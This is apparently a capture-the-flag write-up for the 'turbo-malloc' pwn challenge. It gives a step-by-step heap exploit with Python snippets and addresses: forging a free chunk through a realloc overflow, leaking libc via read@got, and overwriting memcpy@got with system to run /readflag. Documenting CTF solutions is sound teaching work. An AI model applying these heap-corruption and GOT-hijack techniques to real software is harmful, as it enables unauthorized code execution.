# turbo-malloc

**Category:** pwn · **Points:** 73 · **Solves:** 135 · **Author:** Carthago

## Challenge

A note service on a hand-written allocator: one static 1 MiB arena, a singly
linked free list, no consolidation, sixteen slots, five operations.

```
----- Welcome to Turbo Notes -----
1: Create a note
2: Delete a note
3: Read a note
4: Write data to a note
5: Expand a note
6: Expand a note
```

Non-PIE, no canary, no RELRO (`gcc -pedantic -Wall -Werror -no-pie -g`), so the
globals sit at fixed addresses and the GOT is writable. `/flag.txt` is root-only;
a setuid `/readflag` helper (`fopen` + `puts`) prints it.

## TL;DR

`turbo_realloc()` copies the **old** chunk size into a smaller new chunk, so
shrinking a note overflows the next chunk header — and `turbo_free()` only
checks a magic value. Plant a forged `size = 0x1000000` free chunk and the
allocator hands out a block whose header sits at `&notes[-16]`: one note becomes
a read/write window over `notes[]` and `note_sizes[]`. Leak `read@libc`,
overwrite `memcpy@got` with `system`, park `/readflag\0` in a freed chunk, and
let `realloc` call it.

## Files

| file | what it is |
| --- | --- |
| `solve.py` | full exploit (socket / TLS / `--local` docker smoke test) |
| `public/turbo-malloc.c` | the service source |
| `public/libc.so.6` | handout libc (Ubuntu GLIBC 2.39-0ubuntu8.7) |
| `public/readflag.c` | setuid helper that prints `/flag.txt` |
| `public/Dockerfile`, `public/run.sh` | build + `socat tcp-listen:1338,fork ... su=nobody` |

## Analysis

### The allocator

```c
#define MAGIC      ((void*)0xf45735)
#define SIZE       (1024*1024)
#define CHUNK_SIZE sizeof(struct chunk)   /* 16 */
#define NUM_NOTES  16

struct chunk { struct chunk *next; size_t size; char memory[]; };

char          memory[SIZE];               /* 0x4040c0 */
struct chunk *head;                       /* 0x5040c0 */
char         *notes[NUM_NOTES];           /* 0x5040e0 */
unsigned long note_sizes[NUM_NOTES];      /* 0x504160 */
/* GOT: printf 0x404030, read 0x404038, memcpy 0x404048 */
```

`chunk->size` is the payload size, headers are 16 bytes, requests round up to 16
(`size = (size + 15) & -16`). "In use" means `next == MAGIC`, "free" means
`next` is the next free chunk or `NULL`. First fit, and on a hit it splits:

```c
void *start = (char*)current + CHUNK_SIZE + size;
size_t rest = current->size - CHUNK_SIZE - size;
struct chunk *f = create_turbo_free_chunk(start, rest, current->next);
if (prev == NULL) head = f; else prev->next = f;
struct chunk *in_use = create_in_use_chunk(current, size);
return in_use->memory;
```

The remainder size is read from `current->size` before `create_in_use_chunk()`
stamps the in-use header over `current`; if the leftover is `<= CHUNK_SIZE` the
whole chunk is handed out with `current->size` instead. Both helpers write the
16-byte header with `memcpy()`.

Freeing is two lines, no validation beyond the magic:

```c
void turbo_free(void *ptr) {
    struct chunk *chunk = (struct chunk*)((char *)ptr - CHUNK_SIZE);
    if (chunk->next != MAGIC) abort();
    chunk->next = head;
    head = chunk;
}
```

### The bug

```c
void *turbo_realloc(void *ptr, size_t size) {
    void *new_memory = turbo_malloc(size);
    ...
    struct chunk *chunk = (struct chunk*)((char *)ptr - CHUNK_SIZE);
    memcpy(new_memory, chunk->memory, chunk->size);   /* <-- old size */
    turbo_free(ptr);
    return new_memory;
}
```

`turbo_malloc(size)` may return a chunk much smaller than `chunk->size`, but the
copy keeps the old length: shrinking `0x100` → `0x20` copies `0x100` bytes into
a `0x20` block. The new chunk sits at the *front* of the old one, so the
overwritten header is the split remainder — still on the free list — and the
bytes come from our own note.

Handout libc offsets: `read = 0x11ba80`, `memcpy = 0xb1740`, `system = 0x58750`
(`solve.py` re-derives them from `public/libc.so.6` with its own `.dynsym`
parser, so a rebuilt libc works too).

## Solution

Heap addresses are deterministic: the arena is at `memory = 0x4040c0` and the
first `malloc` only creates the initial free chunk, so equal requests get fixed
offsets.

### Step 1 — grow a fake free chunk over a real header

```python
for slot in range(4):
    create(t, slot, 0x100)                   # data at 0x4040d0/1e0/2f0/0x404400
delete(t, 2)                                 # free chunk @0x4042e0, size 0x100
payload = bytearray(b"A" * 0x100)
payload[0x20:0x28] = q(0)                    # fake next
payload[0x28:0x30] = q(0x1000000)            # fake size
write_note(t, 0, bytes(payload))
expand(t, 0, 0x20)
```

`expand(0, 0x20)` calls `turbo_malloc(0x20)`, which splits the freed chunk into
an in-use chunk at `0x4042e0` (size `0x20`, returned `0x4042f0`) and a remainder
header at `0x4042e0 + 0x10 + 0x20 = 0x404310` of size `0xD0`.

`turbo_realloc` then copies `0x100` bytes from `0x4040d0` to `0x4042f0`, and
payload offsets `0x20`/`0x28` land exactly on `0x404310`/`0x404318`: the free
chunk now reads `next = 0`, `size = 0x1000000` — 16 MiB starting inside the
arena and running far past the 1 MiB `memory[]`. `turbo_free(0x4040d0)` then
leaves `head = 0x4040c0 -> 0x404310`.

### Step 2 — ask for almost all of it; the remainder lands at `&notes[-16]`

```python
create(t, 2, 0xFFDB0)                        # takes the fake chunk
create(t, 4, 0x200)                          # slot 4 == &notes[0]
```

The walk skips chunk 0 (`size 0x100`), reaches the forged chunk and splits it:

```
remainder header = 0x404310 + 0x10 + 0xFFDB0 = 0x5040d0
remainder size   = 0x1000000 - 0x10 - 0xFFDB0 = 0xF00240
```

`0x5040d0` is 16 bytes **before** `notes[]`, so the `0x200` request takes that
remainder and `create_in_use_chunk()` stamps `MAGIC`/`0x200` into
`&notes[-16]`. The returned pointer is `0x5040e0` — `notes[0]` itself — so slot 4's payload *is*
the bookkeeping: `notes[0..15]` at `0x5040e0` and `note_sizes[0..15]` at
`0x504160` (`+0x80`). One write rewrites all sixteen pointers and sizes:

```python
values, sizes = [0] * 16, [0] * 16
values[4], sizes[4] = NOTES, 0x200           # keep the master note alive
write_note(t, 4, master_payload(values, sizes, 0x200))
```

Zeroing `notes[1..3]` is harmless — the menu only rejects a slot when
`notes[slot] != NULL`, so those slots become creatable again.

### Step 3 — leak libc through `read@got`

`case 3` does a raw `write(STDOUT_FILENO, notes[slot], note_sizes[slot])`, so
pointing slot 0 at the GOT hands the entry back verbatim.

```python
values[0], sizes[0] = GOT_READ, 0x40         # notes[0] -> 0x404038
write_note(t, 4, master_payload(values, sizes, 0x200))
libc = u64(read_note(t, 0, 0x40)) - offsets["read"]
assert libc & 0xFFF == 0
```

`read` (not `printf`) is used because `printf@got` may hold an IFUNC-resolved
variant; `read` is a plain PLT entry and page-aligns the leak, which the
assertion checks.

### Step 4 — `memcpy@got` → `system`

```python
values[0], sizes[0] = GOT_MEMCPY, 8          # notes[0] -> 0x404048
write_note(t, 4, master_payload(values, sizes, 0x200))
write_note(t, 0, q(libc + offsets["system"]))
```

`memcpy` is the only call site with an attacker-controlled destination pointer in
`rdi`. Hijacking `read`/`write`/`printf` instead is useless: their `rdi` is a
constant file descriptor.

### Step 5 — park a command and let realloc call it

```python
create(t, 1, CMD_SIZE)                       # 0x100 -> data at 0x4040d0
write_note(t, 1, b"/readflag\0")             # CMD_SIZE == 0x100
delete(t, 1)                                 # header rewritten, bytes survive
expand(t, 0, CMD_SIZE)                       # turbo_realloc(0x404048, 0x100)
```

`head` is `0x4040c0`, whose size is exactly `0x100`, so `turbo_malloc(0x100)`
hands out the whole chunk without splitting:

1. `create_in_use_chunk()` writes its header with `memcpy(start, &hdr, 16)` and
   `start = 0x4040c0` — but `memcpy` is `system` now, so the first call is
   `system(0x4040c0)` on header garbage. It fails with "not found" and is
   harmless.
2. `turbo_realloc`'s own copy calls `system(0x4040d0)`, which still holds
   `/readflag\0` from the freed note. The flag is printed.
3. `turbo_free(0x404048)` aborts because the GOT chunk's `next` is not `MAGIC` —
   after the flag, so it does not matter.

Run it:

```
python3 solve.py <HOST> <PORT> --tls --libc public/libc.so.6 --cmd /readflag
```

```
[*] libc offsets: read=0x11ba80 system=0x58750
[*] read@libc = 0x7f...ba80  libc = 0x7f...
[*] triggering system('/readflag')
[+] FLAG: flag{...}
```

`--tls` wraps the socket (`check_hostname=False`, `CERT_NONE`); without it the
script speaks plain TCP, which is what the service's `socat` on port 1338
serves. `--cmd` is passed straight to `system`, so e.g. `cat /flag.txt` also
works. `--local` runs the handout binary in an `ubuntu:24.04` container with a
fake `/flag.txt` (needs docker).

## Flag

```
flag{4gile_and_f4st_n0t3s_what_m0re_c0uld_you_want_f4437659304736eb7a71404b68bcd201}
```

## Notes

* The magic check is the only integrity check in the allocator, so a forged free
  chunk is enough to steer `turbo_malloc` anywhere.
* Dead end: pointing a free chunk straight at `notes - 16` fails, because its
  `size` would be read from `0x5040d8`, which is zero. The header has to be
  written by the split itself — hence the request `0xFFDB0`, not `0xFFDC0`.
* `0x1000000` must survive the `(current->size - size) <= CHUNK_SIZE` shortcut:
  the request has to leave more than 16 bytes over, or the forged size is
  replaced by the chunk size and the remainder never appears.
* `note_sizes[]` keeps the **requested** size, not the aligned one — that is why
  the master note is exactly `0x200` bytes and slot 0 can be re-pointed at
  `read@got` with an arbitrary read length.
